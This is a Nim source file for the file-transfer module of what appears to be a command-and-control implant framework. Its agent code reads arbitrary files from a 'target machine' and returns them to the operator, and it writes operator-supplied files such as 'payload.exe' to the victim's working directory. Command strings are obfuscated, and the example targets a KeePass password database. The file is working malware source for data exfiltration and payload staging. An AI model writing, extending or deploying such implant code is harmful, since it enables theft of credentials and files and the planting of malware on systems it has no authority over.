import ../common/[types, utils]

# Define function prototype
proc executeDownload(ctx: AgentCtx, task: Task): TaskResult
proc executeUpload(ctx: AgentCtx, task: Task): TaskResult

# Module definition
let module* = Module(
    name: protect("filetransfer"), 
    description: protect("Upload/download files to/from the target system."),
    commands: @[
        Command(
            name: protect("download"),
            commandType: CMD_DOWNLOAD,
            description: protect("Download a file."),
            example: protect("download C:\\Users\\john\\Documents\\Database.kdbx"),
            arguments: @[
                Argument(name: protect("file"), description: protect("Path to file to download from the target machine."), argumentType: STRING, isRequired: true),
            ],
            execute: executeDownload
        ),
        Command(
            name: protect("upload"),
            commandType: CMD_UPLOAD,
            description: protect("Upload a file."),
            example: protect("upload /path/to/payload.exe"),
            arguments: @[
                Argument(name: protect("file"), description: protect("Path to file to upload to the target machine."), argumentType: BINARY, isRequired: true),
            ],
            execute: executeUpload
        )
    ]
)

# Implement execution functions
when defined(server):
    proc executeDownload(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeUpload(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import os, std/paths, strutils, strformat
    import ../agent/protocol/result
    import ../common/[utils, serialize]

    proc executeDownload(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var filePath: string = absolutePath(Bytes.toString(task.args[0].data)) 

            echo fmt"   [>] Downloading {filePath}"

            # Read file contents into memory and return them as the result 
            var fileBytes = readFile(filePath)

            # Create result packet for file download            
            var packer = Packer.init() 

            packer.addDataWithLengthPrefix(string.toBytes(filePath))
            packer.addDataWithLengthPrefix(string.toBytes(fileBytes))

            let result = packer.pack() 

            return createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, result)

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))


    proc executeUpload(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var arg: string = Bytes.toString(task.args[0].data) 

            echo arg

            # Parse binary argument
            var unpacker = Unpacker.init(arg) 
            let 
                fileName = unpacker.getDataWithLengthPrefix() 
                fileContents = unpacker.getDataWithLengthPrefix() 

            # Write the file to the current working directory
            let destination = fmt"{paths.getCurrentDir()}\{fileName}"
            writeFile(fmt"{destination}", fileContents)

            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}." & "\n"))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
